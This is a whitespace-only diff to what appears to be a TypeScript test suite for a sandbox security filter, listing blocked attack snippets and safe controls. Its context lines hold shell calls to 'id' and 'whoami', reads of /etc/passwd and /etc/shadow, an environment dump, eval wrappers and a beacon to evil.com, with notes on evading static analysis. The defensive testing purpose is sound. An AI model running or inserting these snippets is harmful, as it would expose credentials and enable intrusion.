@@ -1,9 +1,9 @@
 /**
  * TypeScript Security Attack Vectors
- * 
+ *
  * TypeScript compiles to JavaScript, so it inherits all JS vulnerabilities.
  * These tests verify that malicious code is blocked regardless of TypeScript syntax.
- * 
+ *
  * Each test includes:
  * - name: Test identifier
  * - code: The malicious code attempt
@@ -25,16 +25,16 @@ exec('whoami', callback);`,
     category: 'command_execution',
     explanation: `
       🎯 ATTACK: TypeScript Typed Imports of Dangerous Modules
-      
+
       How hackers use this:
       TypeScript's type annotations don't change runtime behavior.
       Adding types to dangerous imports doesn't make them safe.
-      
+
       Real-world impact:
       - Same as JavaScript child_process attacks
       - Type safety doesn't provide security
       - Compiled JS will execute just like untyped code
-      
+
       Key insight:
       TypeScript is a SUPERSET of JavaScript - if it's dangerous in JS,
       it's equally dangerous in TS. Types are stripped at compile time.
@@ -51,11 +51,11 @@ execute<string>('id');`,
     category: 'command_execution',
     explanation: `
       🎯 ATTACK: Generic Wrapper Around Dangerous Functions
-      
+
       How hackers use this:
       Wrapping dangerous functions in TypeScript generics and promises
       obfuscates the malicious intent while preserving functionality.
-      
+
       Real-world impact:
       - Type-safe interface to command execution
       - Makes malicious code look like legitimate utilities
@@ -75,11 +75,11 @@ console.log(readConfig('/etc/passwd'));`,
     category: 'file_system',
     explanation: `
       🎯 ATTACK: Type-Safe File Operations
-      
+
       How hackers use this:
       TypeScript's PathLike type makes file access look legitimate,
       but the underlying operation is still dangerous.
-      
+
       Real-world impact:
       - Read sensitive system files with proper typing
       - Code appears more "professional" and reviewable
@@ -95,11 +95,11 @@ const content: FileContent = { data: fs.readFileSync('/etc/shadow', 'utf8') };`,
     category: 'file_system',
     explanation: `
       🎯 ATTACK: Structured File Content Extraction
-      
+
       How hackers use this:
       Wrapping stolen file content in typed interfaces makes the code
       look like legitimate data processing.
-      
+
       Real-world impact:
       - /etc/shadow contains password hashes
       - Structured exfiltration payload
@@ -119,11 +119,11 @@ https.get('https://evil.com/beacon', (res: Response) => console.log(res.statusCo
     category: 'network',
     explanation: `
       🎯 ATTACK: Type-Annotated Network Requests
-      
+
       How hackers use this:
       Adding TypeScript interfaces to network requests doesn't change
       their ability to exfiltrate data or beacon to C2 servers.
-      
+
       Real-world impact:
       - Phone home to attacker infrastructure
       - Exfiltrate data with typed payloads
@@ -141,11 +141,11 @@ const beacon = async (): Promise<ApiResponse> => {
     category: 'network',
     explanation: `
       🎯 ATTACK: Modern Async Network Communication
-      
+
       How hackers use this:
       async/await with typed responses makes malicious network code
       look like legitimate API integration.
-      
+
       Real-world impact:
       - Clean async exfiltration code
       - Type-safe C2 communication
@@ -165,11 +165,11 @@ console.log(JSON.stringify(env));`,
     category: 'system_access',
     explanation: `
       🎯 ATTACK: Typed Environment Variable Access
-      
+
       How hackers use this:
       Creating typed interfaces for process.env allows extracting
       all environment variables in a structured format.
-      
+
       Real-world impact:
       - Steal all environment variables at once
       - JSON.stringify for easy exfiltration
@@ -185,11 +185,11 @@ const info: SystemInfo = { hostname: os.hostname(), user: os.userInfo().username
     category: 'system_access',
     explanation: `
       🎯 ATTACK: Structured System Information Gathering
-      
+
       How hackers use this:
       Collecting system information in typed objects creates a clean
       fingerprint of the target system.
-      
+
       Real-world impact:
       - System reconnaissance for targeted attacks
       - Identify high-value targets
@@ -208,11 +208,11 @@ const exec = require(dangerous as string);`,
     category: 'type_abuse',
     explanation: `
       🎯 ATTACK: Type Assertion for Filter Evasion
-      
+
       How hackers use this:
       TypeScript type assertions (as const, as string) are compile-time only.
       They can make code look different while producing identical runtime behavior.
-      
+
       Real-world impact:
       - Bypass AST-based analyzers that don't understand TS
       - Make static analysis harder
@@ -227,11 +227,11 @@ getModule('child_process').exec('id');`,
     category: 'type_abuse',
     explanation: `
       🎯 ATTACK: Using 'any' to Hide Dangerous Operations
-      
+
       How hackers use this:
       The 'any' type disables TypeScript's type checking, allowing
       any value to pass through without compile-time errors.
-      
+
       Real-world impact:
       - Bypass TypeScript's safety guarantees
       - Dynamic module loading without type errors
@@ -247,11 +247,11 @@ cp.exec('whoami');`,
     category: 'type_abuse',
     explanation: `
       🎯 ATTACK: Generic Functions for Module Loading
-      
+
       How hackers use this:
       Generics allow writing functions that can return any type,
       making dangerous module access look like type-safe utilities.
-      
+
       Real-world impact:
       - Type-safe wrapper around require()
       - Reusable attack code
@@ -271,11 +271,11 @@ class Victim {}`,
     category: 'decorator_abuse',
     explanation: `
       🎯 ATTACK: Decorator-based Code Execution
-      
+
       How hackers use this:
       TypeScript decorators execute at class definition time.
       A malicious decorator runs code just by decorating a class.
-      
+
       Real-world impact:
       - Execute code when module loads
       - Hide execution in decorator functions
@@ -292,11 +292,11 @@ class A { @evil method() {} }`,
     category: 'decorator_abuse',
     explanation: `
       🎯 ATTACK: Method Decorator for File Access
-      
+
       How hackers use this:
       Method decorators execute when the class is defined, not when
       the method is called. This allows early code execution.
-      
+
       Real-world impact:
       - Execute before main code runs
       - Read files at import/definition time
@@ -316,11 +316,11 @@ console.log(p.env);`,
     category: 'type_abuse',
     explanation: `
       🎯 ATTACK: Index Signature for Dynamic Access
-      
+
       How hackers use this:
       TypeScript index signatures allow any string as a property key.
       Combined with string concatenation, this bypasses static analysis.
-      
+
       Real-world impact:
       - Access blocked properties dynamically
       - Index signature defeats type-based security
@@ -339,11 +339,11 @@ safeEval<void>("require('child_process').exec('id')");`,
     category: 'code_injection',
     explanation: `
       🎯 ATTACK: Type-Safe Eval Wrapper
-      
+
       How hackers use this:
       Wrapping eval in a typed function doesn't make it safe.
       The type assertion is stripped at compile time.
-      
+
       Real-world impact:
       - "safeEval" name is deceptive
       - Type assertions don't validate or sanitize
@@ -359,11 +359,11 @@ fn();`,
     category: 'code_injection',
     explanation: `
       🎯 ATTACK: Typed Function Constructor
-      
+
       How hackers use this:
       The Function constructor creates functions from strings (like eval).
       Adding types doesn't change this dangerous behavior.
-      
+
       Real-world impact:
       - Dynamic code execution with type safety theater
       - Often missed by TypeScript-aware analyzers
@@ -384,11 +384,11 @@ console.log(obj.polluted);`,
     category: 'prototype_pollution',
     explanation: `
       🎯 ATTACK: Typed Prototype Pollution
-      
+
       How hackers use this:
       TypeScript allows modifying Object.prototype through type assertions.
       The pollution affects all objects at runtime.
-      
+
       Real-world impact:
       - Same as JavaScript prototype pollution
       - Interface makes the pollution look intentional
@@ -409,11 +409,11 @@ Malware.run();`,
     category: 'command_execution',
     explanation: `
       🎯 ATTACK: Namespace-Encapsulated Malware
-      
+
       How hackers use this:
       TypeScript namespaces organize code but don't provide isolation.
       Malicious code inside a namespace runs normally.
-      
+
       Real-world impact:
       - Organize malware in namespaces
       - Look like legitimate utility libraries
@@ -429,11 +429,11 @@ exec('id');`,
     category: 'command_execution',
     explanation: `
       🎯 ATTACK: Module Declaration with Usage
-      
+
       How hackers use this:
       Module augmentation looks like type declarations but includes
       actual imports and usage of dangerous modules.
-      
+
       Real-world impact:
       - Declare and use dangerous modules together
       - Looks like type definition file
@@ -452,11 +452,11 @@ exec('id');`,
     category: 'safe_code',
     explanation: `
       ✅ SAFE: Typed Mathematical Function
-      
+
       This is legitimate code that should NOT be blocked:
       Type-annotated functions performing safe operations
       are exactly what TypeScript is designed for.
-      
+
       Note: Actual execution requires TypeScript transpilation,
       which is a runtime concern separate from security filtering.
     `,
@@ -470,7 +470,7 @@ console.log(p.x + p.y);`,
     category: 'safe_code',
     explanation: `
       ✅ SAFE: Interface-Based Data Structures
-      
+
       This is legitimate code that should NOT be blocked:
       Defining and using interfaces for type safety is
       core TypeScript functionality.
@@ -484,7 +484,7 @@ console.log(identity('hello'));`,
     category: 'safe_code',
     explanation: `
       ✅ SAFE: Generic Identity Function
-      
+
       This is legitimate code that should NOT be blocked:
       Generics without dangerous operations are safe
       and fundamental to TypeScript development.
@@ -501,7 +501,7 @@ console.log(calc.add(5, 3));`,
     category: 'safe_code',
     explanation: `
       ✅ SAFE: Class with Typed Methods
-      
+
       This is legitimate code that should NOT be blocked:
       Object-oriented TypeScript with proper typing
       is standard practice for application development.
@@ -515,7 +515,7 @@ console.log(Color.Green);`,
     category: 'safe_code',
     explanation: `
       ✅ SAFE: Enum Definition and Usage
-      
+
       This is legitimate code that should NOT be blocked:
       Enums are a TypeScript feature for defining
       named constants. Completely safe.
